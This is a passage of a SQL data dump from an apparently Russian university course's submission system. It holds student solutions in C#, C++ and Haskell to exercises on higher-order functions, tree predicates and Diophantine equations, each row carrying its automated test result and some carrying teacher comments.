функция проверки вызывает Any. Попробуйте что-то такое написать, пожалуйста.\r\n   --- Можно, скажем, до среды включительно. Если не очень понятно, о чем речь, напишите, обсудим подробнее. \r\n\r\n            {\r\n\r\n                if (!ax[i].Any(x => x % 2 == 0))\r\n\r\n                {\r\n\r\n                    Console.WriteLine("False");\r\n\r\n                    break;\r\n\r\n                }\r\n\r\n                i++;\r\n\r\n            }\r\n\r\n            if (i == n)\r\n\r\n                Console.WriteLine("True");\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1681, 44, '397095', '2012-10-08 15:32:20', 0, 'import Debug.Trace\n\n\n\n-- (x,y) from ax+by=1 when { gcd(a,b)=1 }\n\neu 0 _ = (0, 1)\n\neu a b = \n\n	let \n\n		(x1, y1) = eu (trace ("eu " ++ show a ++ " " ++ show b) (mod b a)) a\n\n	in\n\n		(y1 - (div b a) * x1, x1)\n\n\n\n-- (x0, y0, tx, ty) from ax+by=c when { c `mod` gcd(a,b) = 0 }\n\nsolve a b c =\n\n	let \n\n		g = gcd a b\n\n		a1 = div a g\n\n		b1 = div b g\n\n		c1 = div c g\n\n		(u, v) = eu a1 b1\n\n		(uu, vv) = (if a < 0 then (-u) else u, if b < 0 then (-v) else v)\n\n	in\n\n		trace ("solve " ++ show a ++ " " ++ show b ++ " " ++ show c ++ " = " ++ show (Lin (uu * c1) b1) ++ ", " ++ show (Lin (vv * c1) (-a1))) (Lin (uu * c1) b1, Lin (vv * c1) (-a1))\n\n\n\n\n\ndata Func = Lin Integer Integer | Any | NoAnswer\n\ninstance Show Func where\n\n	show (NoAnswer) = "NoAnswer"\n\n	show (Any) = "Any"\n\n	show (Lin a b) = show a ++ " + " ++ show b ++ "t"\n\ninstance Eq Func where\n\n	(==) NoAnswer NoAnswer = True\n\n	(==) Any Any = True\n\n	(==) (Lin a b) (Lin c d) = a == c && b == d\n\n	(==) _ _ = False\n\n\n\ndata Const = Const Integer | AnyConst\n\ninstance Eq Const where\n\n	(==) AnyConst AnyConst = True\n\n	(==) (Const x) (Const y) = x == y\n\n	(==) _ _ = False\n\n\n\n-- Variable count checkers\n\ncheck xs = map (x -> if x == 0 then 0 else 1) xs\n\nisNoVar xs = sum (check xs) == 0\n\nisOneVar xs = sum (check xs) == 1\n\nisTwoVar xs = sum (check xs) == 2\n\nisThreeVar xs = sum (check xs) == 3\n\n\n\n-- [(x0, px), (y0, py), (z0, pz)]\n\nsolveOnly [a,b,c,d] =\n\n	let\n\n		no_answer = [NoAnswer,NoAnswer,NoAnswer]\n\n	in\n\n		if isTwoVar [a,b,c]\n\n		then\n\n			if a == 0\n\n			then let (yp,zp) = solve b c d in [Any,yp,zp]\n\n			else if b == 0\n\n			then let (xp,zp) = solve a c d in [xp,Any,zp]\n\n			else if c == 0\n\n			then let (xp,yp) = solve a b d in [xp,yp,Any]\n\n			else no_answer\n\n		else if isOneVar [a,b,c]\n\n		then\n\n			if a /= 0 && mod d a == 0 then [Lin (div d a) 0, Any, Any]\n\n			else if b /= 0 && mod d b == 0 then [Any, Lin (div d b) 0, Any]\n\n			else if c /= 0 && mod d c == 0 then [Any, Any, Lin (div d c) 0]\n\n			else no_answer\n\n		else if d == 0 then [Any,Any,Any]\n\n		else no_answer\n\n\n\nswap (x,y) = (y,x)\n\n\n\ncollinear xs ys = \n\n	let\n\n		sc = sum (map ((x,y) -> x * y) (zip xs ys))\n\n		sx = sum (map (x -> x ^ 2) xs)\n\n		sy = sum (map (y -> y ^ 2) ys)\n\n	in\n\n		sc * sc == sx * sy\n\n\n\n-- (\n\n--  [ (x10, t1x), (y10, t1y), (z10, t1z) ]\n\n--  [ (x20, t2x), (y20, t2y), (z20, t2z) ]\n\n-- )\n\ndiophF [a,b,c,d] [k,l,m,n] =\n\n	let \n\n		firstT = trace ("diophF [" ++ show a ++ "," ++ show b ++ "," ++ show c ++ "," ++ show d ++ "] [" ++ show k ++ "," ++ show l ++ "," ++ show m ++ "," ++ show n ++ "]") (isThreeVar [a,b,c])\n\n		secondT = isThreeVar [k,l,m]\n\n		no_answer = [ NoAnswer, NoAnswer, NoAnswer ]\n\n	in\n\n		if firstT || secondT\n\n		then\n\n			if collinear [a,b,c] [k,l,m] then\n\n				if d * k == n * a then\n\n					let\n\n						n = gcd a b\n\n						(Lin t0 pt, Lin z0 pz) = solve n c d\n\n						(x, y) = solve a b (n * t0)\n\n						answ = [x,y,Lin z0 0]\n\n					in\n\n						(answ, answ)\n\n				else\n\n					(no_answer, no_answer)\n\n			else\n\n				if c < m\n\n				then\n\n					let\n\n						c1 = a * m - c * k\n\n						c2 = b * m - c * l\n\n						c3 = d * m - c * n\n\n						g = gcd c1 c2\n\n					in\n\n						if trace ("gcd c1 c2 = " ++ show g) ((mod c3 g) /= 0) then (no_answer, no_answer) else\n\n							let\n\n								(Lin x0 tx, Lin y0 ty) = solve c1 c2 c3\n\n								c11 = a * tx + b * ty -- t\n\n								c13 = d - a * x0 - b * y0\n\n								c21 = k * tx +l * ty -- t\n\n								c23 = n - k * x0 - l * y0\n\n								g1 = gcd c11 c\n\n								g2 = gcd c21 m\n\n								first = \n\n									if g1 /= 0 && mod c13 g1 == 0 \n\n									then \n\n										let\n\n											(Lin t0 tp, Lin z0 zp) = solve c11 c c13\n\n										in\n\n											[ Lin (x0 + tx * t0) (tx * tp) , Lin (y0 + ty * t0) (ty * tp) , Lin z0 zp ]\n\n									else if g1 == 0\n\n									then [ Lin x0 tx, Lin y0 ty, Any ]\n\n									else no_answer\n\n								second = \n\n									if g2 /= 0 && mod c23 g2 == 0\n\n									then\n\n										let\n\n											(Lin t0 tp, Lin z0 zp) = solve c21 m c23\n\n										in\n\n											[ Lin (x0 + tx * t0) (tx * tp) , Lin (y0 + ty * t0) (ty * tp) , Lin z0 zp ]\n\n									else if g2 == 0\n\n									then [ Lin x0 tx, Lin y0 ty, Any ]\n\n									else no_answer\n\n							in\n\n								(first, second)\n\n\n\n				else\n\n					swap (diophF [k,l,m,n] [a,b,c,d])\n\n		else\n\n			let\n\n				f = solveOnly [a,b,c,d]\n\n				s = solveOnly [k,l,m,n]\n\n			in\n\n				(f,s)\n\n\n\ncalc Any t = 0\n\ncalc (Lin a b) t = a + b * t\n\ncalc NoAnswer t = 0\n\n\n\nvalue (Const c) = c\n\nvalue AnyConst = 0\n\n\n\ngetA (Lin a b) = a\n\ngetB (Lin a b) = b\n\n\n\nextract x1 x2 = \n\n	if x1 == Any then (x2, AnyConst, AnyConst) else if x2 == Any then (x1, AnyConst, AnyConst) else \n\n		let\n\n			(u, t) = solve (getB x2) (-getB x1) (getA x1 - getA x2)\n\n			u0 = calc u 0\n\n			t0 = calc t 0\n\n		in\n\n			(x1, Const t0, Const u0)\n\n\n\n\n\nanswer :: ( [Func], [Func] ) -> [ Integer ]\n\nanswer ( [NoAnswer, NoAnswer, NoAnswer] , _ ) = [ 0, 0, 0 ]\n\nanswer ( _ , [NoAnswer, NoAnswer, NoAnswer] ) = [ 0, 0, 0 ]\n\nanswer ( [x1, y1, z1], [x2, y2, z2] ) =\n\n	let \n\n		(x, t0, u0) = extract x1 x2\n\n	in\n\n		if t0 == AnyConst && u0 == AnyConst then\n\n			let\n\n				(y, t0, u0) = extract y1 y2\n\n			in\n\n				if t0 == AnyConst && u0 == AnyConst then\n\n					let\n\n						(z, t0, u0) = extract z1 z2\n\n					in\n\n						if t0 == AnyConst && u0 == AnyConst then\n\n							trace ":Any -> Any -> Any" [calc x 0, calc y 0, calc z 0]\n\n						else\n\n							trace (":Any -> Any -> " ++ show (value t0)) [calc x (value t0), calc y (value t0), calc z (value t0)]\n\n				else\n\n					let\n\n						z10 = calc z1 (value t0)\n\n						z20 = calc z2 (value u0)\n\n					in\n\n						if z10 == z20 then\n\n							trace (":Any -> " ++ show (value t0)) [calc x (value t0), calc y (value t0), z10]\n\n						else\n\n							trace "Z1 fail" [0,0,0]\n\n		else\n\n			let \n\n				y10 = calc y1 (value t0)\n\n				y20 = calc y2 (value u0)\n\n			in\n\n				if y1 == Any || y2 == Any || y10 == y20 then\n\n					let \n\n						z10 = calc z1 (value t0)\n\n						z20 = calc z2 (value u0)\n\n					in\n\n						if z1 == Any || z2 == Any || z10 == z20 then\n\n							trace (":" ++ show (value t0)) [calc x (value t0), if y1 == Any then y20 else y10, if z1 == Any then z20 else z10]\n\n						else\n\n							trace "Z2 fail" [0,0,0]\n\n				else\n\n					trace ("Y fail: " ++ show (value t0) ++ ", " ++ show (value u0)) [0,0,0]\n\n\n\ndioph f s = answer (diophF f s)\n\n\n\n--main = print (dioph [25,33,0,1] [1,0,1,0])\n\n--main = print (dioph [1,2,3,14] [1,1,1,1])\n\n--main = print (dioph [1,0,1,2] [0,1,0,0])\n\n\n', 'Выражение имеет неправильное значение: let [x,y,z] = dioph [7,11,0,1] [0,25,19,1] in (7*x+11*y, 25*y+19*z)'),
(1682, 44, '397095', '2012-10-08 15:36:24', 1, 'import Debug.Trace\r\n\r\n\r\n\r\n-- (x,y) from ax+by=1 when { gcd(a,b)=1 }\r\n\r\neu 0 _ = (0, 1)\r\n\r\neu a b = \r\n\r\n	let \r\n\r\n		(x1, y1) = eu (trace ("eu " ++ show a ++ " " ++ show b) (mod b a)) a\r\n\r\n	in\r\n\r\n		(y1 - (div b a) * x1, x1)\r\n\r\n\r\n\r\n-- (x0, y0, tx, ty) from ax+by=c when { c `mod` gcd(a,b) = 0 }\r\n\r\nsolve a b c =\r\n\r\n	let \r\n\r\n		g = gcd a b\r\n\r\n		a1 = div a g\r\n\r\n		b1 = div b g\r\n\r\n		c1 = div c g\r\n\r\n		(u, v) = eu a1 b1\r\n\r\n		(uu, vv) = (if a < 0 then (-u) else u, if b < 0 then (-v) else v)\r\n\r\n	in\r\n\r\n		trace ("solve " ++ show a ++ " " ++ show b ++ " " ++ show c ++ " = " ++ show (Lin (uu * c1) b1) ++ ", " ++ show (Lin (vv * c1) (-a1))) (Lin (uu * c1) b1, Lin (vv * c1) (-a1))\r\n\r\n\r\n\r\n\r\n\r\ndata Func = Lin Integer Integer | Any | NoAnswer\r\n\r\ninstance Show Func where\r\n\r\n	show (NoAnswer) = "NoAnswer"\r\n\r\n	show (Any) = "Any"\r\n\r\n	show (Lin a b) = show a ++ " + " ++ show b ++ "t"\r\n\r\ninstance Eq Func where\r\n\r\n	(==) NoAnswer NoAnswer = True\r\n\r\n	(==) Any Any = True\r\n\r\n	(==) (Lin a b) (Lin c d) = a == c && b == d\r\n\r\n	(==) _ _ = False\r\n\r\n\r\n\r\ndata Const = Const Integer | AnyConst\r\n\r\ninstance Eq Const where\r\n\r\n	(==) AnyConst AnyConst = True\r\n\r\n	(==) (Const x) (Const y) = x == y\r\n\r\n	(==) _ _ = False\r\n\r\n\r\n\r\n-- Variable count checkers\r\n\r\ncheck xs = map (x -> if x == 0 then 0 else 1) xs\r\n\r\nisNoVar xs = sum (check xs) == 0\r\n\r\nisOneVar xs = sum (check xs) == 1\r\n\r\nisTwoVar xs = sum (check xs) == 2\r\n\r\nisThreeVar xs = sum (check xs) == 3\r\n\r\n\r\n\r\n-- [(x0, px), (y0, py), (z0, pz)]\r\n\r\nsolveOnly [a,b,c,d] =\r\n\r\n	let\r\n\r\n		no_answer = [NoAnswer,NoAnswer,NoAnswer]\r\n\r\n	in\r\n\r\n		if isTwoVar [a,b,c]\r\n\r\n		then\r\n\r\n			if a == 0\r\n\r\n			then let (yp,zp) = solve b c d in [Any,yp,zp]\r\n\r\n			else if b == 0\r\n\r\n			then let (xp,zp) = solve a c d in [xp,Any,zp]\r\n\r\n			else if c == 0\r\n\r\n			then let (xp,yp) = solve a b d in [xp,yp,Any]\r\n\r\n			else no_answer\r\n\r\n		else if isOneVar [a,b,c]\r\n\r\n		then\r\n\r\n			if a /= 0 && mod d a == 0 then [Lin (div d a) 0, Any, Any]\r\n\r\n			else if b /= 0 && mod d b == 0 then [Any, Lin (div d b) 0, Any]\r\n\r\n			else if c /= 0 && mod d c == 0 then [Any, Any, Lin (div d c) 0]\r\n\r\n			else no_answer\r\n\r\n		else if d == 0 then [Any,Any,Any]\r\n\r\n		else no_answer\r\n\r\n\r\n\r\nswap (x,y) = (y,x)\r\n\r\n\r\n\r\ncollinear xs ys = \r\n\r\n	let\r\n\r\n		sc = sum (map ((x,y) -> x * y) (zip xs ys))\r\n\r\n		sx = sum (map (x -> x ^ 2) xs)\r\n\r\n		sy = sum (map (y -> y ^ 2) ys)\r\n\r\n	in\r\n\r\n		sc * sc == sx * sy\r\n\r\n\r\n\r\n-- (\r\n\r\n--  [ (x10, t1x), (y10, t1y), (z10, t1z) ]\r\n\r\n--  [ (x20, t2x), (y20, t2y), (z20, t2z) ]\r\n\r\n-- )\r\n\r\ndiophF [a,b,c,d] [k,l,m,n] =\r\n\r\n	let \r\n\r\n		firstT = trace ("diophF [" ++ show a ++ "," ++ show b ++ "," ++ show c ++ "," ++ show d ++ "] [" ++ show k ++ "," ++ show l ++ "," ++ show m ++ "," ++ show n ++ "]") (isThreeVar [a,b,c])\r\n\r\n		secondT = isThreeVar [k,l,m]\r\n\r\n		no_answer = [ NoAnswer, NoAnswer, NoAnswer ]\r\n\r\n	in\r\n\r\n		if firstT || secondT\r\n\r\n		then\r\n\r\n			if collinear [a,b,c] [k,l,m] then\r\n\r\n				if d * k == n * a then\r\n\r\n					let\r\n\r\n						n = gcd a b\r\n\r\n						(Lin t0 pt, Lin z0 pz) = solve n c d\r\n\r\n						(x, y) = solve a b (n * t0)\r\n\r\n						answ = [x,y,Lin z0 0]\r\n\r\n					in\r\n\r\n						(answ, answ)\r\n\r\n				else\r\n\r\n					(no_answer, no_answer)\r\n\r\n			else\r\n\r\n				if c < m\r\n\r\n				then\r\n\r\n					let\r\n\r\n						c1 = a * m - c * k\r\n\r\n						c2 = b * m - c * l\r\n\r\n						c3 = d * m - c * n\r\n\r\n						g = gcd c1 c2\r\n\r\n					in\r\n\r\n						if trace ("gcd c1 c2 = " ++ show g) ((mod c3 g) /= 0) then (no_answer, no_answer) else\r\n\r\n							let\r\n\r\n								(Lin x0 tx, Lin y0 ty) = solve c1 c2 c3\r\n\r\n								c11 = a * tx + b * ty -- t\r\n\r\n								c13 = d - a * x0 - b * y0\r\n\r\n								c21 = k * tx +l * ty -- t\r\n\r\n								c23 = n - k * x0 - l * y0\r\n\r\n								g1 = gcd c11 c\r\n\r\n								g2 = gcd c21 m\r\n\r\n								first = \r\n\r\n									if g1 /= 0 && mod c13 g1 == 0 \r\n\r\n									then \r\n\r\n										let\r\n\r\n											(Lin t0 tp, Lin z0 zp) = solve c11 c c13\r\n\r\n										in\r\n\r\n											[ Lin (x0 + tx * t0) (tx * tp) , Lin (y0 + ty * t0) (ty * tp) , Lin z0 zp ]\r\n\r\n									else if g1 == 0\r\n\r\n									then [ Lin x0 tx, Lin y0 ty, Any ]\r\n\r\n									else no_answer\r\n\r\n								second = \r\n\r\n									if g2 /= 0 && mod c23 g2 == 0\r\n\r\n									then\r\n\r\n										let\r\n\r\n											(Lin t0 tp, Lin z0 zp) = solve c21 m c23\r\n\r\n										in\r\n\r\n											[ Lin (x0 + tx * t0) (tx * tp) , Lin (y0 + ty * t0) (ty * tp) , Lin z0 zp ]\r\n\r\n									else if g2 == 0\r\n\r\n									then [ Lin x0 tx, Lin y0 ty, Any ]\r\n\r\n									else no_answer\r\n\r\n							in\r\n\r\n								(first, second)\r\n\r\n\r\n\r\n				else\r\n\r\n					swap (diophF [k,l,m,n] [a,b,c,d])\r\n\r\n		else\r\n\r\n			let\r\n\r\n				f = solveOnly [a,b,c,d]\r\n\r\n				s = solveOnly [k,l,m,n]\r\n\r\n			in\r\n\r\n				(f,s)\r\n\r\n\r\n\r\ncalc Any t = 0\r\n\r\ncalc (Lin a b) t = a + b * t\r\n\r\ncalc NoAnswer t = 0\r\n\r\n\r\n\r\nvalue (Const c) = c\r\n\r\nvalue AnyConst = 0\r\n\r\n\r\n\r\ngetA (Lin a b) = a\r\n\r\ngetB (Lin a b) = b\r\n\r\n\r\n\r\nextract x1 x2 = \r\n\r\n	if x1 == Any then (x2, AnyConst, AnyConst) else if x2 == Any then (x1, AnyConst, AnyConst) else \r\n\r\n		let\r\n\r\n			(u, t) = solve (getB x2) (-getB x1) (getA x1 - getA x2)\r\n\r\n			u0 = calc u 0\r\n\r\n			t0 = calc t 0\r\n\r\n		in\r\n\r\n			(x1, Const t0, Const u0)\r\n\r\n\r\n\r\n\r\n\r\nanswer :: ( [Func], [Func] ) -> [ Integer ]\r\n\r\nanswer ( [NoAnswer, NoAnswer, NoAnswer] , _ ) = [ 0, 0, 0 ]\r\n\r\nanswer ( _ , [NoAnswer, NoAnswer, NoAnswer] ) = [ 0, 0, 0 ]\r\n\r\nanswer ( [x1, y1, z1], [x2, y2, z2] ) =\r\n\r\n	let \r\n\r\n		(x, t0, u0) = extract x1 x2\r\n\r\n	in\r\n\r\n		if t0 == AnyConst && u0 == AnyConst then\r\n\r\n			let\r\n\r\n				(y, t0, u0) = extract y1 y2\r\n\r\n			in\r\n\r\n				if t0 == AnyConst && u0 == AnyConst then\r\n\r\n					let\r\n\r\n						(z, t0, u0) = extract z1 z2\r\n\r\n					in\r\n\r\n						if t0 == AnyConst && u0 == AnyConst then\r\n\r\n							trace ":Any -> Any -> Any" [calc x 0, calc y 0, calc z 0]\r\n\r\n						else\r\n\r\n							trace (":Any -> Any -> " ++ show (value t0)) [calc x (value t0), calc y (value t0), calc z (value t0)]\r\n\r\n				else\r\n\r\n					let\r\n\r\n						z10 = calc z1 (value t0)\r\n\r\n						z20 = calc z2 (value u0)\r\n\r\n					in\r\n\r\n						if z1 == Any || z2 == Any || z10 == z20 then\r\n\r\n							trace (":Any -> " ++ show (value t0)) [calc x (value t0), calc y (value t0), if z1 == Any then z20 else z10]\r\n\r\n						else\r\n\r\n							trace "Z1 fail" [0,0,0]\r\n\r\n		else\r\n\r\n			let \r\n\r\n				y10 = calc y1 (value t0)\r\n\r\n				y20 = calc y2 (value u0)\r\n\r\n			in\r\n\r\n				if y1 == Any || y2 == Any || y10 == y20 then\r\n\r\n					let \r\n\r\n						z10 = calc z1 (value t0)\r\n\r\n						z20 = calc z2 (value u0)\r\n\r\n					in\r\n\r\n						if z1 == Any || z2 == Any || z10 == z20 then\r\n\r\n							trace (":" ++ show (value t0)) [calc x (value t0), if y1 == Any then y20 else y10, if z1 == Any then z20 else z10]\r\n\r\n						else\r\n\r\n							trace "Z2 fail" [0,0,0]\r\n\r\n				else\r\n\r\n					trace ("Y fail: " ++ show (value t0) ++ ", " ++ show (value u0)) [0,0,0]\r\n\r\n\r\n\r\ndioph f s = answer (diophF f s)\r\n\r\n\r\n\r\n\r\n\r\n--c ([a,b,c,d],[k,l,m,n]) = let [x,y,z] = dioph [a,b,c,d] [k,l,m,n] in [a * x + b * y + c * z == d, k * x + l * y + m * z == n]\r\n\r\n\r\n\r\n--main = print (map c [([7,11,0,1],[0,25,19,1]) , ([1,0,1,2],[0,1,0,0]) , ([1,2,3,14],[1,1,1,1]) , ([25,33,0,1],[1,0,1,0]) ])\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1683, 46, '383483', '2012-10-08 16:11:06', 1, '// 8-2.cpp : Defines the entry point for the console application.\r\n//\r\n\r\n#include <stdafx.h>;\r\n#include <vector>\r\n#include <algorithm>\r\n#include <iostream>;\r\nusing namespace std;\r\n\r\nbool Even (int x) {\r\n	return ((x%2==0));\r\n}\r\n\r\nint main()\r\n{\r\n	vector<int> vect;\r\n	vector<int>::iterator iter;\r\n        //задаем руками вектор: \r\n	vect.push_back(1);\r\n	vect.push_back(3);\r\n	vect.push_back(7);\r\n	vect.push_back(10);\r\n	vect.push_back(25);\r\n	vect.push_back(29);\r\n\r\n	iter = find_if (vect.begin(),vect.end(),Even);\r\n	if (iter==vect.end())\r\n		cout<<"False";\r\n	else cout<<"True";\r\n\r\n    return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1684, 46, '83813', '2012-10-08 16:28:08', 1, '#include <algorithm>\r\n\r\n#include <vector>\r\n\r\n#include <iostream>\r\n\r\n\r\n\r\nusing std::cerr;\r\n\r\n\r\n\r\n/*\r\n\r\n * Somewhy my compiler does not find std::tr1\r\n\r\n *\r\n\r\nusing std::tr1::function;\r\n\r\nvoid check(std::vector <int> vector, function<bool (int)> p) {\r\n\r\n  std::vector <int>::iterator it = find_if(vector.begin(), vector.end(), p);\r\n\r\n  if (it == vector.end()) {\r\n\r\n    cerr << "Not found" << std::endl;\r\n\r\n  } else {\r\n\r\n    cerr << "Found at position " << it - vector.begin() << std::endl;\r\n\r\n  }\r\n\r\n}\r\n\r\n*/\r\n\r\n\r\n\r\nvoid out_vector(std::vector <int> test_vector) {\r\n\r\n  for_each(test_vector.begin(), test_vector.end(), [](int n) {\r\n\r\n        cerr << n << " ";\r\n\r\n      });\r\n\r\n  cerr << std::endl;\r\n\r\n}\r\n\r\n\r\n\r\nvoid check_for_odd(std::vector <int> test_vector) {\r\n\r\n  cerr << "Trying to find odd number: ";\r\n\r\n  std::vector<int>::iterator it = find_if(test_vector.begin(), test_vector.end(), [](int n) -> bool {\r\n\r\n        return n % 2 == 0;\r\n\r\n      });\r\n\r\n  if (it == test_vector.end()) {\r\n\r\n    cerr << "Not found" << std::endl;\r\n\r\n  } else {\r\n\r\n    cerr << "Found at position " << it - test_vector.begin() << std::endl;\r\n\r\n  }\r\n\r\n}\r\n\r\n\r\n\r\nint main() {\r\n\r\n  std::vector <int> test_vector(10);\r\n\r\n  for (size_t i = 0; i < 10; ++i) {\r\n\r\n    test_vector[i] = 2 * i + 1;\r\n\r\n  }\r\n\r\n\r\n\r\n  out_vector(test_vector);\r\n\r\n  check_for_odd(test_vector);\r\n\r\n\r\n\r\n  test_vector.push_back(2);\r\n\r\n\r\n\r\n  out_vector(test_vector);\r\n\r\n  check_for_odd(test_vector);\r\n\r\n\r\n\r\n  return 0;\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1685, 59, '3431532', '2012-10-08 16:45:35', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.IO;\r\nusing System.Text;\r\n\r\nnamespace ConsoleApplication1\r\n{\r\n    class Program\r\n    {\r\n        static void Main(string[] args)\r\n        {\r\n\r\n            List<int> list = new List<int>();\r\n            list.Add(20); list.Add(23); list.Add(4); list.Add(39);\r\n\r\n            foreach(int x in nonZeroLastDigits(list))\r\n                 Console.WriteLine(x);\r\n        }\r\n\r\n        static List<int> nonZeroLastDigits(List<int> items)\r\n        {\r\n            return items.Select(x => x%10).Where(x => x>0).ToList();\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1686, 49, '787463', '2012-10-08 17:07:02', 1, 'using System;\r\n\r\n\r\n\r\nnamespace task_10_1\r\n\r\n{\r\n\r\n	class Node\r\n\r\n	{\r\n\r\n		public Node(int val) {\r\n\r\n			this.Val = val;\r\n\r\n		}\r\n\r\n		\r\n\r\n		public Node(int val, Node left, Node right) {\r\n\r\n			this.Val = val;\r\n\r\n			this.Right = right;\r\n\r\n			this.Left = left;\r\n\r\n		}\r\n\r\n		\r\n\r\n		public bool Any(Func<int, bool> p)\r\n\r\n		{\r\n\r\n			if (p(Val) || Left != null && Left.Any(p) || Right != null && Right.Any(p))\r\n\r\n			{\r\n\r\n				return true;\r\n\r\n			}\r\n\r\n			\r\n\r\n			return false;\r\n\r\n		}\r\n\r\n		\r\n\r\n		private int Val;\r\n\r\n		private Node Left;\r\n\r\n		private Node Right;\r\n\r\n	}\r\n\r\n	\r\n\r\n	class Task\r\n\r\n	{\r\n\r\n		public static void Main (string[] args)\r\n\r\n		{\r\n\r\n			Node n = new Node(1, new Node(1), new Node(1, new Node(1), null));\r\n\r\n			Console.WriteLine("{0}", n.Any(x => x % 2 == 0));\r\n\r\n			\r\n\r\n			n = new Node(1, new Node(1), new Node(1, new Node(2), null));\r\n\r\n			Console.WriteLine("{0}", n.Any(x => x % 2 == 0));\r\n\r\n		}\r\n\r\n	}\r\n\r\n}\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1687, 50, '787463', '2012-10-08 17:07:19', 1, '#include <iostream>\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\ntypedef bool (*Fun)(int n);\r\n\r\n\r\n\r\nclass Node\r\n\r\n{\r\n\r\npublic:\r\n\r\n	Node(int const value, const Node *left = NULL, const Node *right = NULL)\r\n\r\n			: mValue(value)\r\n\r\n			, mLeft(left)\r\n\r\n			, mRight(right)\r\n\r\n	{\r\n\r\n	}\r\n\r\n		\r\n\r\n	bool any(const Fun p) const {\r\n\r\n		if (p(mValue) || mLeft != NULL && mLeft->any(p) || mRight != NULL && mRight->any(p))\r\n     --- Или просто return p(mValue) || mLeft != NULL && mLeft->any(p) || mRight != NULL && mRight->any(p);\r\n		{\r\n\r\n			return true;\r\n\r\n		}\r\n\r\n		\r\n\r\n		return false;\r\n\r\n	}\r\n\r\n	\r\n\r\n	void setValue(int const value) {\r\n\r\n		mValue = value;\r\n\r\n	}\r\n\r\n	\r\n\r\nprivate:\r\n\r\n	int mValue;\r\n\r\n	const Node *mLeft;\r\n\r\n	const Node *mRight;\r\n\r\n};\r\n\r\n\r\n\r\nint main () {\r\n\r\n	Node *n11 = new Node(1);\r\n\r\n	const Node *n12 = new Node(1);\r\n\r\n	const Node *n2 = new Node(1, n11, NULL);\r\n\r\n	const Node *n3 = new Node(1, NULL, n2);\r\n\r\n	const Node *n4 = new Node(1, n12, n3);\r\n\r\n	\r\n\r\n	cout << n4->any([](int x) { return x % 2 == 0; }) << endl;\r\n\r\n	\r\n\r\n	n11->setValue(2);\r\n\r\n	\r\n\r\n	cout << n4->any([](int x) { return x % 2 == 0; });\r\n\r\n	\r\n\r\n	delete n11;\r\n\r\n	delete n12;\r\n\r\n	delete n2;\r\n\r\n	delete n3;\r\n\r\n	delete n4;\r\n\r\n	\r\n\r\n	return 0;\r\n\r\n}', '<br/>Тесты успешно пройдены!'),
(1688, 59, '787463', '2012-10-08 17:07:35', 1, 'using System;\r\n\r\nusing System.Linq;\r\n\r\n\r\n\r\nnamespace task_13_1\r\n\r\n{\r\n\r\n	class Task\r\n\r\n	{\r\n\r\n		static int[] nonZeroLastDigits(int[] array)\r\n\r\n		{\r\n\r\n			return array.Select(x => x % 10).ToArray().Where(x => x > 0).ToArray();\r\n\r\n		}\r\n\r\n\r\n\r\n		static void Main(string[] args)\r\n\r\n		{\r\n\r\n			int[] a = {354, 20, 9, 31};\r\n\r\n			\r\n\r\n			foreach (int x in nonZeroLastDigits(a))\r\n\r\n			{\r\n\r\n				Console.Write("{0} ", x);\r\n\r\n			}\r\n\r\n		}\r\n\r\n	}\r\n\r\n}\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1689, 60, '787463', '2012-10-08 17:07:50', 1, '#include <iostream>\r\n\r\n#include <algorithm>\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\nvoid nonZeroLastDigits(const int array[], size_t const arrayLength) {\r\n\r\n	int temp[arrayLength];\r\n\r\n	transform(array, array + arrayLength, temp, [] (int i) { return i % 10; });\r\n\r\n	int *end = remove_if(temp, temp + arrayLength, [] (int i) { return i == 0; });\r\n\r\n	int *iter = temp;\r\n\r\n	while (iter != end) {\r\n\r\n		cout << *iter << " ";\r\n\r\n		iter++;\r\n\r\n	}\r\n\r\n}\r\n\r\n\r\n\r\nint main () {\r\n\r\n	const int array[] = {354, 20, 9, 31};\r\n\r\n	int const arrayLength = sizeof array / sizeof array[0];\r\n\r\n	\r\n\r\n	nonZeroLastDigits(array, arrayLength);\r\n\r\n	\r\n\r\n	return 0;\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1690, 60, '3431532', '2012-10-08 17:08:48', 1, '#include "stdafx.h"\r\n#include <stdio.h>\r\n#include <iostream>\r\n#include <algorithm>                                     \r\n#include <vector>\r\nusing namespace std;\r\n\r\nvector<int> nonZeroLastDigits(vector<int> input)\r\n{\r\n	transform(input.begin(), input.end(), input.begin(), [](int x){ return x%10;});\r\n	remove_if(input.begin(), input.end(), [](int x){return (x == 0);});\r\n	return input;\r\n}\r\n\r\nint main()\r\n{\r\n	vector<int> v;\r\n	v.push_back(27);v.push_back(21);	v.push_back(20);	v.push_back(29);v.push_back(28);v.push_back(26);\r\n	vector<int> vn = nonZeroLastDigits(v);\r\n	for(vector<int>::iterator iter = vn.begin(); iter != vn.end()-1; ++iter)\r\n	{\r\n		cout<<*iter<<endl;\r\n	}\r\n	return 0;\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1691, 49, '51559263', '2012-10-08 17:16:44', 1, 'using System;\r\n\r\nnamespace Tree\r\n{\r\n    class BinTree\r\n    {\r\n        public BinTree( int _value )\r\n        {\r\n            value = _value;\r\n        }\r\n\r\n        public BinTree( int _value, BinTree _left, BinTree _right )\r\n        {\r\n            value = _value;\r\n            left = _left;\r\n            right = _right;\r\n        }\r\n\r\n        public bool Any( Predicate<int> f )\r\n        {\r\n            if ( f(value) )\r\n                return true;\r\n\r\n            if ( left != null && right == null )\r\n                return left.Any(f);\r\n\r\n            if ( left == null && right != null )\r\n                return right.Any(f);\r\n\r\n            if ( left == null && right == null )\r\n                return false;\r\n\r\n            return ( left.Any(f) || right.Any(f) );\r\n        }\r\n        \r\n        public int value;\r\n        public BinTree left, right;\r\n    }\r\n\r\n    class Program\r\n    {\r\n        static void Main( )\r\n        {\r\n            BinTree bt = new BinTree( -1, new BinTree( 5, 